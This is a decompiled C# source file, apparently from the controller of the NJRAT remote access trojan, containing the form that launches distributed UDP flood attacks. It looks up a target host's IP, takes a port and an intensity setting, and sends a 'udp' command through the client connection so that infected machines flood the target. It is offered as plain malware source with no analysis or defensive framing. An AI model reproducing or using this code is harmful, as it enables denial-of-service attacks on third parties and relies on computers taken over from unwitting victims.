using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.My;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x0200000F RID: 15
	[DesignerGenerated]
	public partial class Dos : Form
	{
		// Token: 0x06000127 RID: 295 RVA: 0x001509FC File Offset: 0x0014EDFC
		public Dos()
		{
			base.Activated += this.Form2_Activated;
			Dos.__ENCAddToList(this);
			this.delay = 100;
			this.InitializeComponent();
		}

		// Token: 0x06000128 RID: 296 RVA: 0x00150A30 File Offset: 0x0014EE30
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Dos.__ENCList;
			lock (_ENCList)
			{
				bool flag = Dos.__ENCList.Count == Dos.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Dos.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Dos.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Dos.__ENCList[num] = Dos.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Dos.__ENCList.RemoveRange(num, Dos.__ENCList.Count - num);
					Dos.__ENCList.Capacity = Dos.__ENCList.Count;
				}
				Dos.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x0600012B RID: 299 RVA: 0x00151768 File Offset: 0x0014FB68
		// (set) Token: 0x0600012C RID: 300 RVA: 0x00151780 File Offset: 0x0014FB80
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x0600012D RID: 301 RVA: 0x001517E0 File Offset: 0x0014FBE0
		// (set) Token: 0x0600012E RID: 302 RVA: 0x001517F8 File Offset: 0x0014FBF8
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x0600012F RID: 303 RVA: 0x00151804 File Offset: 0x0014FC04
		// (set) Token: 0x06000130 RID: 304 RVA: 0x0015181C File Offset: 0x0014FC1C
		internal virtual TextBox TextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.TextBox2_TextChanged);
				bool flag = this._TextBox2 != null;
				if (flag)
				{
					this._TextBox2.TextChanged -= eventHandler;
				}
				this._TextBox2 = value;
				flag = this._TextBox2 != null;
				if (flag)
				{
					this._TextBox2.TextChanged += eventHandler;
				}
			}
		}

		// Token: 0x1700006F RID: 111
		// (get) Token: 0x06000131 RID: 305 RVA: 0x0015187C File Offset: 0x0014FC7C
		// (set) Token: 0x06000132 RID: 306 RVA: 0x00151894 File Offset: 0x0014FC94
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x06000133 RID: 307 RVA: 0x001518A0 File Offset: 0x0014FCA0
		// (set) Token: 0x06000134 RID: 308 RVA: 0x001518B8 File Offset: 0x0014FCB8
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x06000135 RID: 309 RVA: 0x001518C4 File Offset: 0x0014FCC4
		// (set) Token: 0x06000136 RID: 310 RVA: 0x001518DC File Offset: 0x0014FCDC
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= eventHandler;
				}
				this._Button2 = value;
				flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x06000137 RID: 311 RVA: 0x0015193C File Offset: 0x0014FD3C
		// (set) Token: 0x06000138 RID: 312 RVA: 0x00151954 File Offset: 0x0014FD54
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x06000139 RID: 313 RVA: 0x00151960 File Offset: 0x0014FD60
		// (set) Token: 0x0600013A RID: 314 RVA: 0x00151978 File Offset: 0x0014FD78
		internal virtual LV Logs
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Logs;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Logs = value;
			}
		}

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x0600013B RID: 315 RVA: 0x00151984 File Offset: 0x0014FD84
		// (set) Token: 0x0600013C RID: 316 RVA: 0x0015199C File Offset: 0x0014FD9C
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x17000075 RID: 117
		// (get) Token: 0x0600013D RID: 317 RVA: 0x001519A8 File Offset: 0x0014FDA8
		// (set) Token: 0x0600013E RID: 318 RVA: 0x001519C0 File Offset: 0x0014FDC0
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x17000076 RID: 118
		// (get) Token: 0x0600013F RID: 319 RVA: 0x001519CC File Offset: 0x0014FDCC
		// (set) Token: 0x06000140 RID: 320 RVA: 0x001519E4 File Offset: 0x0014FDE4
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x17000077 RID: 119
		// (get) Token: 0x06000141 RID: 321 RVA: 0x001519F0 File Offset: 0x0014FDF0
		// (set) Token: 0x06000142 RID: 322 RVA: 0x00151A08 File Offset: 0x0014FE08
		internal virtual ToolStripMenuItem ClearLogsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ClearLogsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ClearLogsToolStripMenuItem_Click);
				bool flag = this._ClearLogsToolStripMenuItem != null;
				if (flag)
				{
					this._ClearLogsToolStripMenuItem.Click -= eventHandler;
				}
				this._ClearLogsToolStripMenuItem = value;
				flag = this._ClearLogsToolStripMenuItem != null;
				if (flag)
				{
					this._ClearLogsToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000078 RID: 120
		// (get) Token: 0x06000143 RID: 323 RVA: 0x00151A68 File Offset: 0x0014FE68
		// (set) Token: 0x06000144 RID: 324 RVA: 0x00151A80 File Offset: 0x0014FE80
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ComboBox1_SelectedIndexChanged);
				bool flag = this._ComboBox1 != null;
				if (flag)
				{
					this._ComboBox1.SelectedIndexChanged -= eventHandler;
				}
				this._ComboBox1 = value;
				flag = this._ComboBox1 != null;
				if (flag)
				{
					this._ComboBox1.SelectedIndexChanged += eventHandler;
				}
			}
		}

		// Token: 0x17000079 RID: 121
		// (get) Token: 0x06000145 RID: 325 RVA: 0x00151AE0 File Offset: 0x0014FEE0
		// (set) Token: 0x06000146 RID: 326 RVA: 0x00151AF8 File Offset: 0x0014FEF8
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		// Token: 0x1700007A RID: 122
		// (get) Token: 0x06000147 RID: 327 RVA: 0x00151B04 File Offset: 0x0014FF04
		// (set) Token: 0x06000148 RID: 328 RVA: 0x00151B1C File Offset: 0x0014FF1C
		internal virtual TextBox TextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox3 = value;
			}
		}

		// Token: 0x1700007B RID: 123
		// (get) Token: 0x06000149 RID: 329 RVA: 0x00151B28 File Offset: 0x0014FF28
		// (set) Token: 0x0600014A RID: 330 RVA: 0x00151B40 File Offset: 0x0014FF40
		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		// Token: 0x0600014B RID: 331 RVA: 0x00151B4C File Offset: 0x0014FF4C
		private void Form2_Activated(object sender, EventArgs e)
		{
			this.TextBox2.Focus();
		}

		// Token: 0x0600014C RID: 332 RVA: 0x00151B5C File Offset: 0x0014FF5C
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Start Flood", false) == 0;
			if (flag)
			{
				this.Button1.Text = "Stop Flood";
				try
				{
					NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("udp", MyProject.Forms.Form1.Yy), this.TextBox3.Text), MyProject.Forms.Form1.Yy), this.TextBox2.Text), MyProject.Forms.Form1.Yy), this.delay) }, null, null, null, true);
					this.Logs.Items.Add(string.Concat(new string[]
					{
						"UDP Flood ",
						this.TextBox1.Text,
						":",
						this.TextBox2.Text,
						" ",
						this.ComboBox1.Text
					})).ForeColor = Color.MintCream;
				}
				catch (Exception ex)
				{
				}
			}
			else
			{
				this.Button1.Text = "Start Flood";
				this.s.Send("udpstp");
			}
		}

		// Token: 0x0600014D RID: 333 RVA: 0x00151CF8 File Offset: 0x001500F8
		private void TextBox2_TextChanged(object sender, EventArgs e)
		{
			try
			{
				int num = Conversions.ToInteger(this.TextBox2.Text);
				bool flag = (Conversions.ToDouble(this.TextBox2.Text) > 65534.0) | (Conversions.ToDouble(this.TextBox2.Text) < 1.0);
				if (flag)
				{
					this.Button1.Enabled = false;
				}
				else
				{
					this.Button1.Enabled = true;
				}
			}
			catch (Exception ex)
			{
				this.Button1.Enabled = false;
			}
		}

		// Token: 0x0600014E RID: 334 RVA: 0x00151DA4 File Offset: 0x001501A4
		private void Button2_Click(object sender, EventArgs e)
		{
			try
			{
				string text = ((IPAddress)Dns.GetHostByName(this.TextBox1.Text).AddressList.GetValue(0)).ToString();
				this.TextBox3.Text = text;
			}
			catch (Exception ex)
			{
				this.TextBox3.Text = "NONE!";
			}
		}

		// Token: 0x0600014F RID: 335 RVA: 0x00151E1C File Offset: 0x0015021C
		private void ClearLogsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Logs.Items.Clear();
		}

		// Token: 0x06000150 RID: 336 RVA: 0x00151E34 File Offset: 0x00150234
		private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.ComboBox1.Text, "VHigh", false) == 0;
			if (flag)
			{
				this.delay = 20;
			}
			else
			{
				flag = Operators.CompareString(this.ComboBox1.Text, "High", false) == 0;
				if (flag)
				{
					this.delay = 50;
				}
				else
				{
					flag = Operators.CompareString(this.ComboBox1.Text, "Medium", false) == 0;
					if (flag)
					{
						this.delay = 100;
					}
					else
					{
						flag = Operators.CompareString(this.ComboBox1.Text, "Slow", false) == 0;
						if (flag)
						{
							this.delay = 250;
						}
						else
						{
							flag = Operators.CompareString(this.ComboBox1.Text, "VSlow", false) == 0;
							if (flag)
							{
								this.delay = 400;
							}
							else
							{
								flag = Operators.CompareString(this.ComboBox1.Text, "Full!!!", false) == 0;
								if (flag)
								{
									this.delay = 1;
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x0400008B RID: 139
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400008D RID: 141
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x0400008E RID: 142
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x0400008F RID: 143
		[AccessedThroughProperty("TextBox2")]
		private TextBox _TextBox2;

		// Token: 0x04000090 RID: 144
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000091 RID: 145
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x04000092 RID: 146
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x04000093 RID: 147
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x04000094 RID: 148
		[AccessedThroughProperty("Logs")]
		private LV _Logs;

		// Token: 0x04000095 RID: 149
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x04000096 RID: 150
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x04000097 RID: 151
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x04000098 RID: 152
		[AccessedThroughProperty("ClearLogsToolStripMenuItem")]
		private ToolStripMenuItem _ClearLogsToolStripMenuItem;

		// Token: 0x04000099 RID: 153
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x0400009A RID: 154
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x0400009B RID: 155
		[AccessedThroughProperty("TextBox3")]
		private TextBox _TextBox3;

		// Token: 0x0400009C RID: 156
		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		// Token: 0x0400009D RID: 157
		public Client s;

		// Token: 0x0400009E RID: 158
		public int delay;
	}
}
